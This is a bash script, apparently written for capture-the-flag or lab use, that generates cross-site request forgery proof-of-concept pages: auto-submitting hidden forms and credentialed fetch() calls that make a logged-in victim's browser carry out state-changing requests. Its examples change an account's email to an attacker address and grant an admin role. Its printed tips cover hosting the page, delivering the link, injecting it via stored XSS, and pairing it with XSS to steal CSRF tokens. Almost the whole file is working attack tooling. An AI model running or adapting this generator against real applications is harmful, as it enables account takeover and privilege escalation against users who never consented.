#!/usr/bin/env bash
# csrf-gen — build a CSRF proof-of-concept page from a state-changing request, to be
# visited by an emulated/admin user (the bots that browse the app). Host it and point
# the victim at it; their authenticated browser performs the action.
#
# Emits BOTH an auto-submitting HTML form (classic form POST/GET) and a fetch() variant
# (credentials:'include') for JSON endpoints. Local only — no third party.
#
# Usage:
#   ./csrf-gen.sh <GET|POST> <action-url> '<body: a=1&b=2  OR  {"a":1}>' [outfile]
#
# Examples:
#   ./csrf-gen.sh POST http://t/account/email 'email=attacker@evil.test'
#   ./csrf-gen.sh POST http://t/api/user/role '{"role":"admin"}' role-csrf.html
set -uo pipefail
METHOD="${1:?usage: csrf-gen.sh <GET|POST> <action-url> '<body>' [outfile]}"
ACTION="${2:?need action url}"
BODY="${3:-}"
OUT="${4:-csrf-poc.html}"

is_json=0; case "$BODY" in \{*) is_json=1;; esac

{
echo '<!doctype html><html><head><meta charset="utf-8"><title>csrf</title></head><body>'
echo "<!-- CSRF PoC for: $METHOD $ACTION -->"
if [ "$is_json" -eq 1 ]; then
  # JSON body -> fetch with credentials (works when there is no CSRF token and CORS/SameSite allow it)
  bjs=$(printf '%s' "$BODY" | sed "s/'/\\\\'/g")   # escape single quotes for the JS string
  echo '<script>'
  echo "fetch('$ACTION',{method:'$METHOD',credentials:'include',headers:{'Content-Type':'application/json'},body:'$bjs'});"
  echo '</script>'
  echo '<p>submitting…</p>'
else
  # form-encoded -> auto-submitting form (also carries cookies, no preflight)
  echo "<form id=f action=\"$ACTION\" method=\"$METHOD\">"
  if [ -n "$BODY" ]; then
    IFS='&' read -ra kv <<<"$BODY"
    for p in "${kv[@]}"; do
      k="${p%%=*}"; v="${p#*=}"
      # minimal HTML-attr escaping for quotes
      v=$(printf '%s' "$v" | sed 's/"/\&quot;/g'); k=$(printf '%s' "$k" | sed 's/"/\&quot;/g')
      echo "  <input type=\"hidden\" name=\"$k\" value=\"$v\">"
    done
  fi
  echo '</form><script>document.getElementById("f").submit();</script>'
  echo '<p>submitting…</p>'
fi
echo '</body></html>'
} > "$OUT"

echo "[*] wrote $OUT"
echo "[*] host it where the emulated user can reach you, then deliver the link (or inject it via stored XSS):"
echo "    python3 -m http.server 8000 --bind 0.0.0.0   # then victim visits http://<your-ip>:8000/$OUT"
[ "$is_json" -eq 1 ] && echo "[note] JSON/fetch CSRF needs no CSRF token AND permissive CORS or a SameSite=None cookie; a form POST is more reliable if the endpoint accepts form-encoding."
echo "[note] If the app uses CSRF tokens, this won't work blind — pair with XSS to read the token, or use the form only for token-less actions."
